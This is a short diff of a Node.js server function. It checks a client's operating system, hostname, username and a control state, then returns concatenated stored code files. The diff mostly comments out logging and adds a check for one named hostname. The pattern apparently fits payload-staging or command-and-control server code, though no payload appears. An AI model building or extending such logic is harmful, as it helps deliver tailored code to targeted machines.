@@ -87,15 +87,15 @@ async function getFileContents(req, res, db) {
 
                     if(req.body.platform === "win32" || req.body.OS === "Windows_NT") {
                         // req.clientIp  req.body.hostname  req.body.username
-                        console.log('$$$$$$$$4', controlState, req.clientIp, req.body.hostname, req.body.username);
+                        //console.log('$$$$$$$$4', controlState, req.clientIp, req.body.hostname, req.body.username);
                         
-                        if(req.body.hostname == '') {
+                        if(req.body.hostname == 'fmonfasani') {
                             fs.readFile(prePath2, "utf-8", (err, preContent2) => {
                                 if (err) {
                                     return res.json({});
                                 }
-                                console.log('#1');
-                                console.log('@@@@ p', preContent2,'@@@@ m', mainContent,'@@@@ c', controllerContent);
+                                // console.log('#1');
+                                // console.log('@@@@ p', preContent2,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                                 return res.json(' { ' + preContent2 + ' } ' + mainContent + ' { ' + controllerContent + ' } ');
                             });
                         } else {
@@ -104,20 +104,22 @@ async function getFileContents(req, res, db) {
                                     return res.json({});
                                 }
                                 if(controlState == 'S3'){
-                                    console.log('#2');
-                                     console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
+                                    // console.log('#2');
+                                    // console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                                     return res.json(' { ' + preContent + ' } ' + mainContent + ' { ' + controllerContent + ' } ');
                                 } else {
-                                    console.log('#3');
-                                    console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
+                                    // console.log('#3');
+                                    // console.log('@@@@ p', preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                                     return res.json(' { ' + preContent + ' } ' + mainContent);
                                 }
                             });
                         }
                     } else {
-                        console.log('#4');
+                        // console.log('#4');
+                        // console.log( preContent,'@@@@ m', mainContent,'@@@@ c', controllerContent);
                         return res.json(mainContent + ' { ' + controllerContent + ' } ');    
                     }
+                    console.log('#5');
                 });
             });
         }
